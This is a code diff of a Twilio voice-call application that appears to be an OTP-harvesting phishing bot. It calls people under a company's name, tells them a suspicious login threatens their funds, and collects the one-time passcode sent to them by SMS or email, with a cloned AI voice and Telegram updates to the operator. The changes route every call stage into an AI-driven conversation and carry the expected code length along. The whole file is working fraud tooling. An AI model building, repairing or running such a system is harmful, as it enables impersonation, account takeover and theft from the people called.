@@ -1581,7 +1581,9 @@ def get_call_delivery(call_sid: str, user_id: str) -> str:
 
 
 def get_call_code_length(call_sid: str, user_id: str) -> int:
-    code_length = get_call_setting(call_sid, user_id, "code_length", "Digits.txt", "6")
+    code_length = get_call_setting(call_sid, user_id, "code_length", "CodeLength.txt", "")
+    if str(code_length).strip() in ("", "None", "unknown"):
+        code_length = get_call_setting(call_sid, user_id, "code_length", "Digits.txt", "6")
     try:
         code_length_value = int(code_length)
     except (TypeError, ValueError):
@@ -4151,6 +4153,45 @@ def log_amd_report(call_sid: Optional[str], session: Optional[dict], answered_by
         session["amd_secondary_verification_required"] = decision == "unknown"
 
 
+def _build_ai_flow_redirect_url(
+    user_id: str,
+    chat_id: Optional[int] = None,
+    voice_id: Optional[str] = None,
+    name: Optional[str] = None,
+    company: Optional[str] = None,
+    from_name: Optional[str] = None,
+    emotion: Optional[str] = None,
+    language: Optional[str] = None,
+    delivery: Optional[str] = None,
+    code_length: Optional[str] = None,
+    call_type: str = "normal",
+    mode_label: str = "AI Flow",
+) -> str:
+    redirect_url = (
+        f"/ai_start?user_id={quote_plus(str(user_id))}"
+        f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
+        f"&call_type={quote_plus(str(call_type))}"
+        f"&mode_label={quote_plus(str(mode_label))}"
+    )
+    if voice_id:
+        redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
+    if name:
+        redirect_url += f"&name={quote_plus(str(name))}"
+    if company:
+        redirect_url += f"&company={quote_plus(str(company))}"
+    if from_name:
+        redirect_url += f"&from_name={quote_plus(str(from_name))}"
+    if emotion:
+        redirect_url += f"&emotion={quote_plus(str(emotion))}"
+    if language:
+        redirect_url += f"&language={quote_plus(str(language))}"
+    if delivery:
+        redirect_url += f"&delivery={quote_plus(str(delivery))}"
+    if code_length not in (None, "", "None", "unknown"):
+        redirect_url += f"&code_length={quote_plus(str(code_length))}"
+    return redirect_url
+
+
 @app.route("/handle_greeting", methods=["POST"])
 @twilio_request_logger("/handle_greeting")
 def handle_greeting():
@@ -4191,29 +4232,6 @@ def handle_greeting():
 
     session["greeting_attempts"] = session.get("greeting_attempts", 0)
 
-    def _gather_greeting(prompt_text: str) -> Response:
-        resp = VoiceResponse()
-        gather_action = (
-            f"/handle_greeting?user_id={quote_plus(str(user_id))}"
-            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-        )
-        gather = Gather(
-            input="speech dtmf",
-            timeout=8,
-            speech_timeout="auto",
-            action=gather_action,
-            method="POST",
-            language="en-US" if language == "en" else "fr-FR",
-            speech_model="phone_call",
-        )
-        prompt_audio = generate_call_audio(user_id=user_id, text=prompt_text, voice_id=voice_id, filename="greeting_prompt.mp3")
-        if prompt_audio:
-            gather.play(prompt_audio)
-        else:
-            gather.say(prompt_text)
-        resp.append(gather)
-        return Response(str(resp), content_type="application/xml")
-
     # If async AMD already determined answer type, prefer that canonical source
     answered_by = session.get("answered_by") if session else None
     if answered_by:
@@ -4228,25 +4246,18 @@ def handle_greeting():
                 except Exception as e:
                     logger.debug(f"Failed to send 'Human Pressed 1' notification: {e}")
 
-            redirect_url = (
-                f"/ai_start?user_id={quote_plus(str(user_id))}"
-                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-                f"&call_type=normal&mode_label=AI%20Flow"
+            redirect_url = _build_ai_flow_redirect_url(
+                user_id=user_id,
+                chat_id=chat_id,
+                voice_id=voice_id,
+                name=name,
+                company=company,
+                from_name=from_name,
+                emotion=emotion,
+                language=language,
+                delivery=delivery,
+                code_length=get_call_code_length(call_sid, user_id),
             )
-            if voice_id:
-                redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
-            if name:
-                redirect_url += f"&name={quote_plus(str(name))}"
-            if company:
-                redirect_url += f"&company={quote_plus(str(company))}"
-            if from_name:
-                redirect_url += f"&from_name={quote_plus(str(from_name))}"
-            if emotion:
-                redirect_url += f"&emotion={quote_plus(str(emotion))}"
-            if language:
-                redirect_url += f"&language={quote_plus(str(language))}"
-            if delivery:
-                redirect_url += f"&delivery={quote_plus(str(delivery))}"
             resp = VoiceResponse()
             resp.redirect(redirect_url, method="POST")
             return Response(str(resp), content_type="application/xml")
@@ -4266,25 +4277,18 @@ def handle_greeting():
             if chat_id is not None:
                 send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
             session["greeting_attempts"] = 0
-            redirect_url = (
-                f"/ai_start?user_id={quote_plus(str(user_id))}"
-                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-                f"&call_type=normal&mode_label=AI%20Flow"
+            redirect_url = _build_ai_flow_redirect_url(
+                user_id=user_id,
+                chat_id=chat_id,
+                voice_id=voice_id,
+                name=name,
+                company=company,
+                from_name=from_name,
+                emotion=emotion,
+                language=language,
+                delivery=delivery,
+                code_length=get_call_code_length(call_sid, user_id),
             )
-            if voice_id:
-                redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
-            if name:
-                redirect_url += f"&name={quote_plus(str(name))}"
-            if company:
-                redirect_url += f"&company={quote_plus(str(company))}"
-            if from_name:
-                redirect_url += f"&from_name={quote_plus(str(from_name))}"
-            if emotion:
-                redirect_url += f"&emotion={quote_plus(str(emotion))}"
-            if language:
-                redirect_url += f"&language={quote_plus(str(language))}"
-            if delivery:
-                redirect_url += f"&delivery={quote_plus(str(delivery))}"
             resp = VoiceResponse()
             resp.redirect(redirect_url, method="POST")
             return Response(str(resp), content_type="application/xml")
@@ -4300,46 +4304,39 @@ def handle_greeting():
         if chat_id is not None:
             send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
         session["greeting_attempts"] = 0
-        redirect_url = (
-            f"/ai_start?user_id={quote_plus(str(user_id))}"
-            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-            f"&call_type=normal&mode_label=AI%20Flow"
+        redirect_url = _build_ai_flow_redirect_url(
+            user_id=user_id,
+            chat_id=chat_id,
+            voice_id=voice_id,
+            name=name,
+            company=company,
+            from_name=from_name,
+            emotion=emotion,
+            language=language,
+            delivery=delivery,
+            code_length=get_call_code_length(call_sid, user_id),
         )
-        if voice_id:
-            redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
-        if name:
-            redirect_url += f"&name={quote_plus(str(name))}"
-        if company:
-            redirect_url += f"&company={quote_plus(str(company))}"
-        if from_name:
-            redirect_url += f"&from_name={quote_plus(str(from_name))}"
-        if emotion:
-            redirect_url += f"&emotion={quote_plus(str(emotion))}"
-        if language:
-            redirect_url += f"&language={quote_plus(str(language))}"
-        if delivery:
-            redirect_url += f"&delivery={quote_plus(str(delivery))}"
         resp = VoiceResponse()
         resp.redirect(redirect_url, method="POST")
         return Response(str(resp), content_type="application/xml")
 
     session["greeting_attempts"] += 1
-    if session["greeting_attempts"] >= 2:
-        resp = VoiceResponse()
-        final = "I'm sorry, we seem to have a poor connection. Please call us back. Goodbye."
-        audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="greeting_no_response_final.mp3")
-        if audio_final:
-            resp.play(audio_final)
-        else:
-            resp.say(final)
-        resp.hangup()
-        return Response(str(resp), content_type="application/xml")
-
-    prompt = (
-        f"Hello. This is {caller_identity}. May I speak with {name}? "
-        "Please say yes or press 1 now."
+    resp = VoiceResponse()
+    resp.redirect(
+        _build_ai_flow_redirect_url(
+            user_id=user_id,
+            chat_id=chat_id,
+            voice_id=voice_id,
+            name=name,
+            company=company,
+            from_name=from_name,
+            emotion=emotion,
+            language=language,
+            delivery=delivery,
+        ),
+        method="POST",
     )
-    return _gather_greeting(prompt)
+    return Response(str(resp), content_type="application/xml")
 
 
 @app.route("/handle_acknowledgment", methods=["POST"])
@@ -4389,29 +4386,6 @@ def handle_acknowledgment():
 
     session["ack_attempts"] = session.get("ack_attempts", 0)
 
-    def _gather_acknowledgment(prompt_text: str) -> Response:
-        resp = VoiceResponse()
-        gather_action = (
-            f"/handle_acknowledgment?user_id={quote_plus(str(user_id))}"
-            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-        )
-        gather = Gather(
-            input="speech dtmf",
-            timeout=8,
-            speech_timeout="auto",
-            action=gather_action,
-            method="POST",
-            language="en-US" if language == "en" else "fr-FR",
-            speech_model="phone_call",
-        )
-        prompt_audio = generate_call_audio(user_id=user_id, text=prompt_text, voice_id=voice_id, filename="acknowledgment_prompt.mp3")
-        if prompt_audio:
-            gather.play(prompt_audio)
-        else:
-            gather.say(prompt_text)
-        resp.append(gather)
-        return Response(str(resp), content_type="application/xml")
-
     logger.info(
         f"[ACK] call_sid={call_sid[:8] if call_sid else 'unknown'} speech={speech_result or 'none'} digits={digits or 'none'} ack_attempts={session.get('ack_attempts')} user={user_id}"
     )
@@ -4423,25 +4397,18 @@ def handle_acknowledgment():
             if chat_id is not None:
                 send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
             session["ack_attempts"] = 0
-            redirect_url = (
-                f"/ai_start?user_id={quote_plus(str(user_id))}"
-                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-                f"&call_type=normal&mode_label=AI%20Flow"
+            redirect_url = _build_ai_flow_redirect_url(
+                user_id=user_id,
+                chat_id=chat_id,
+                voice_id=voice_id,
+                name=name,
+                company=company,
+                from_name=from_name,
+                emotion=emotion,
+                language=language,
+                delivery=delivery,
+                code_length=get_call_code_length(call_sid, user_id),
             )
-            if voice_id:
-                redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
-            if name:
-                redirect_url += f"&name={quote_plus(str(name))}"
-            if company:
-                redirect_url += f"&company={quote_plus(str(company))}"
-            if from_name:
-                redirect_url += f"&from_name={quote_plus(str(from_name))}"
-            if emotion:
-                redirect_url += f"&emotion={quote_plus(str(emotion))}"
-            if language:
-                redirect_url += f"&language={quote_plus(str(language))}"
-            if delivery:
-                redirect_url += f"&delivery={quote_plus(str(delivery))}"
             resp = VoiceResponse()
             resp.redirect(redirect_url, method="POST")
             return Response(str(resp), content_type="application/xml")
@@ -4457,25 +4424,18 @@ def handle_acknowledgment():
         if chat_id is not None:
             send_telegram_status(chat_id, "📞 A human answered the call. Continuing with the AI flow.")
         session["ack_attempts"] = 0
-        redirect_url = (
-            f"/ai_start?user_id={quote_plus(str(user_id))}"
-            f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-            f"&call_type=normal&mode_label=AI%20Flow"
+        redirect_url = _build_ai_flow_redirect_url(
+            user_id=user_id,
+            chat_id=chat_id,
+            voice_id=voice_id,
+            name=name,
+            company=company,
+            from_name=from_name,
+            emotion=emotion,
+            language=language,
+            delivery=delivery,
+            code_length=get_call_code_length(call_sid, user_id),
         )
-        if voice_id:
-            redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
-        if name:
-            redirect_url += f"&name={quote_plus(str(name))}"
-        if company:
-            redirect_url += f"&company={quote_plus(str(company))}"
-        if from_name:
-            redirect_url += f"&from_name={quote_plus(str(from_name))}"
-        if emotion:
-            redirect_url += f"&emotion={quote_plus(str(emotion))}"
-        if language:
-            redirect_url += f"&language={quote_plus(str(language))}"
-        if delivery:
-            redirect_url += f"&delivery={quote_plus(str(delivery))}"
         resp = VoiceResponse()
         resp.redirect(redirect_url, method="POST")
         return Response(str(resp), content_type="application/xml")
@@ -4494,25 +4454,18 @@ def handle_acknowledgment():
                 except Exception as e:
                     logger.debug(f"Failed to send 'Human Pressed 1' notification: {e}")
 
-            redirect_url = (
-                f"/ai_start?user_id={quote_plus(str(user_id))}"
-                f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-                f"&call_type=normal&mode_label=AI%20Flow"
+            redirect_url = _build_ai_flow_redirect_url(
+                user_id=user_id,
+                chat_id=chat_id,
+                voice_id=voice_id,
+                name=name,
+                company=company,
+                from_name=from_name,
+                emotion=emotion,
+                language=language,
+                delivery=delivery,
+                code_length=get_call_code_length(call_sid, user_id),
             )
-            if voice_id:
-                redirect_url += f"&voice_id={quote_plus(str(voice_id))}"
-            if name:
-                redirect_url += f"&name={quote_plus(str(name))}"
-            if company:
-                redirect_url += f"&company={quote_plus(str(company))}"
-            if from_name:
-                redirect_url += f"&from_name={quote_plus(str(from_name))}"
-            if emotion:
-                redirect_url += f"&emotion={quote_plus(str(emotion))}"
-            if language:
-                redirect_url += f"&language={quote_plus(str(language))}"
-            if delivery:
-                redirect_url += f"&delivery={quote_plus(str(delivery))}"
             resp = VoiceResponse()
             resp.redirect(redirect_url, method="POST")
             return Response(str(resp), content_type="application/xml")
@@ -4533,21 +4486,23 @@ def handle_acknowledgment():
         return Response(str(resp), content_type="application/xml")
 
     session["ack_attempts"] += 1
-    if session["ack_attempts"] >= 2:
-        resp = VoiceResponse()
-        final = "I'm sorry, we seem to have a poor connection. Please call us back. Goodbye."
-        audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="ack_no_response_final.mp3")
-        if audio_final:
-            resp.play(audio_final)
-        else:
-            resp.say(final)
-        resp.hangup()
-        return Response(str(resp), content_type="application/xml")
-
-    prompt = (
-        f"Hello? Can you hear me? If you can, please say yes or press 1 now."
+    resp = VoiceResponse()
+    resp.redirect(
+        _build_ai_flow_redirect_url(
+            user_id=user_id,
+            chat_id=chat_id,
+            voice_id=voice_id,
+            name=name,
+            company=company,
+            from_name=from_name,
+            emotion=emotion,
+            language=language,
+            delivery=delivery,
+            code_length=get_call_code_length(call_sid, user_id),
+        ),
+        method="POST",
     )
-    return _gather_acknowledgment(prompt)
+    return Response(str(resp), content_type="application/xml")
 
 
 @app.route("/present_urgency", methods=["POST"])
@@ -4564,37 +4519,25 @@ def present_urgency():
     name = get_call_name(call_sid, user_id)
     company = get_call_company(call_sid, user_id)
     from_name = get_call_from_name(call_sid, user_id)
-
-    if from_name:
-        caller_identity = f"{from_name} from {company}"
-    else:
-        caller_identity = company
+    emotion = request.values.get("emotion") or request.args.get("emotion") or "neutral"
+    delivery = request.values.get("delivery") or request.args.get("delivery") or get_call_delivery(call_sid, user_id)
 
     resp = VoiceResponse()
-    gather_action = (
-        f"/handle_dtmf_press_1?user_id={quote_plus(str(user_id))}"
-        f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-    )
-    gather = Gather(
-        num_digits=1,
-        action=gather_action,
-        timeout=5,
-        input="dtmf",
+    resp.redirect(
+        _build_ai_flow_redirect_url(
+            user_id=user_id,
+            chat_id=chat_id,
+            voice_id=voice_id,
+            name=name,
+            company=company,
+            from_name=from_name,
+            emotion=emotion,
+            language=language,
+            delivery=delivery,
+            code_length=get_call_code_length(call_sid, user_id),
+        ),
         method="POST",
-        finish_on_key="",
     )
-    gather.say(f"Thank you for confirming your identity.")
-    gather.pause(length=1)
-    gather.say(
-        f"We are calling because our systems flagged an unusual login attempt on your account from an unrecognised device."
-    )
-    gather.pause(length=1)
-    gather.say("For your protection, we need to perform a quick security verification.")
-    gather.pause(length=1)
-    gather.say("This will only take a moment.")
-    gather.pause(length=1)
-    gather.say("To begin, please press 1 on your keypad now.")
-    resp.append(gather)
     return Response(str(resp), content_type="application/xml")
 
 
@@ -4609,6 +4552,12 @@ def handle_dtmf_press_1():
     chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
     digits = (request.values.get("Digits") or "").strip()
     voice_id, voice_name = get_request_voice_info(call_sid, user_id)
+    language = get_call_language(call_sid, user_id)
+    name = get_call_name(call_sid, user_id)
+    company = get_call_company(call_sid, user_id)
+    from_name = get_call_from_name(call_sid, user_id)
+    emotion = request.values.get("emotion") or request.args.get("emotion") or "neutral"
+    delivery = request.values.get("delivery") or request.args.get("delivery") or get_call_delivery(call_sid, user_id)
 
     session = get_call_session(call_sid)
     if call_sid and session is None:
@@ -4632,43 +4581,29 @@ def handle_dtmf_press_1():
         redirect_url = (
             f"/capture_otp?user_id={quote_plus(str(user_id))}"
             f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
+            f"&code_length={quote_plus(str(get_call_code_length(call_sid, user_id)))}"
         )
         resp = VoiceResponse()
         resp.redirect(redirect_url, method="POST")
         return Response(str(resp), content_type="application/xml")
 
     session["press1_attempts"] += 1
-    if session["press1_attempts"] >= 2:
-        resp = VoiceResponse()
-        final = (
-            "I'm sorry, I didn't hear a response. Please contact our support line. Goodbye."
-        )
-        audio_final = generate_call_audio(user_id=user_id, text=final, voice_id=voice_id, filename="press1_no_response_final.mp3")
-        if audio_final:
-            resp.play(audio_final)
-        else:
-            resp.say(final)
-        resp.hangup()
-        return Response(str(resp), content_type="application/xml")
-
     resp = VoiceResponse()
-    retry_prompt = (
-        "To continue, please press 1 on your keypad now."
-    )
-    gather_action = (
-        f"/handle_dtmf_press_1?user_id={quote_plus(str(user_id))}"
-        f"&chat_id={quote_plus(str(chat_id or 'unknown'))}"
-    )
-    gather = Gather(
-        num_digits=1,
-        action=gather_action,
-        timeout=5,
-        input="dtmf",
+    resp.redirect(
+        _build_ai_flow_redirect_url(
+            user_id=user_id,
+            chat_id=chat_id,
+            voice_id=voice_id,
+            name=name,
+            company=company,
+            from_name=from_name,
+            emotion=emotion,
+            language=language,
+            delivery=delivery,
+            code_length=get_call_code_length(call_sid, user_id),
+        ),
         method="POST",
-        finish_on_key="",
     )
-    gather.say(retry_prompt)
-    resp.append(gather)
     return Response(str(resp), content_type="application/xml")
 
 
@@ -4689,7 +4624,9 @@ def capture_otp():
     from_name = get_call_from_name(call_sid, user_id)
     language = get_call_language(call_sid, user_id)
     delivery = get_call_delivery(call_sid, user_id)
-    code_length = get_call_code_length(call_sid, user_id)
+    code_length = request.values.get("code_length") or request.args.get("code_length")
+    if str(code_length).strip() in ("", "None", "unknown"):
+        code_length = get_call_code_length(call_sid, user_id)
     try:
         code_length = int(code_length)
     except (TypeError, ValueError):
@@ -4703,39 +4640,24 @@ def capture_otp():
         caller_identity = f"{company}"
 
     if language == "fr":
-        if delivery == "email":
-            delivery_text = "courriel"
-        else:
-            delivery_text = "SMS"
         confirm_prompt = (
-            f"Bonjour. Ceci est {caller_identity}. "
-            f"Puis-je parler à {name} ? Nous avons détecté une activité suspecte sur votre compte, "
-            f"et devons vérifier votre identité immédiatement pour protéger vos fonds. "
-            f"Un code à {code_length} chiffres a été envoyé par {delivery_text}. "
-            "Veuillez appuyer sur 1 maintenant pour confirmer que vous êtes le titulaire du compte et poursuivre la vérification."
+            "Veuillez appuyer sur 1 pour continuer la vérification et confirmer votre identité."
         )
         otp_prompt = (
-            f"Merci. Un code à {code_length} chiffres a été envoyé par {delivery_text}. "
-            "Veuillez entrer le code suivi de la touche dièse (#)."
+            f"Veuillez saisir le code à {code_length} chiffres suivi de la touche dièse (#)."
         )
-        retry_text = "Veuillez appuyer sur 1 pour continuer le processus de vérification."
-        no_response_text = "Désolé, je n'ai pas entendu de réponse. Ceci est une vérification obligatoire."
+        retry_text = "Veuillez appuyer sur 1 pour continuer la vérification."
+        no_response_text = "Aucune réponse n'a été reçue. Veuillez réessayer."
         timeout_text = "Aucune entrée n'a été reçue. Merci. Au revoir."
     else:
-        delivery_text = "email" if delivery == "email" else "SMS"
         confirm_prompt = (
-            f"Hello. This is {caller_identity}. "
-            f"May I speak with {name}? We have detected a suspicious login attempt on your account, "
-            f"and need to verify your identity immediately to protect your funds. "
-            f"A {delivery_text} one-time passcode has been sent for {code_length}-digit verification. "
-            "Please press 1 now to confirm you are the account holder and wish to proceed with verification."
+            "Please press 1 to continue verification and confirm your identity."
         )
         otp_prompt = (
-            f"Thank you. We have sent a {code_length}-digit one-time passcode via {delivery_text}. "
-            "Please enter the code followed by the pound key (#)."
+            f"Please enter the {code_length}-digit code followed by the pound key (#)."
         )
         retry_text = "Please press 1 to continue the verification process."
-        no_response_text = "I'm sorry, I didn't hear a response. This is a mandatory verification."
+        no_response_text = "No response was received. Please try again."
         timeout_text = "No input was received. Goodbye."
 
     session = get_call_session(call_sid) if call_sid else None
@@ -4752,6 +4674,7 @@ def capture_otp():
                 redirect_url = (
                     f"/capture_otp?user_id={quote_plus(str(user_id))}"
                     f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
+                    f"&code_length={quote_plus(str(code_length))}"
                 )
                 resp = VoiceResponse()
                 resp.redirect(redirect_url)
@@ -4781,6 +4704,7 @@ def capture_otp():
             gather_action = (
                 f"/capture_otp?user_id={quote_plus(str(user_id))}"
                 f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=confirm1&after_gather=1"
+                f"&code_length={quote_plus(str(code_length))}"
             )
             gather = Gather(
                 num_digits=1,
@@ -4833,6 +4757,7 @@ def capture_otp():
             gather_action = (
                 f"/capture_otp?user_id={quote_plus(str(user_id))}"
                 f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp&after_gather=1"
+                f"&code_length={quote_plus(str(code_length))}"
             )
             gather = Gather(
                 num_digits=code_length,
@@ -4942,6 +4867,7 @@ def capture_otp():
         resp.redirect(
             f"/capture_otp?user_id={quote_plus(str(user_id))}"
             f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
+            f"&code_length={quote_plus(str(code_length))}"
         )
         return Response(str(resp), content_type="application/xml")
 
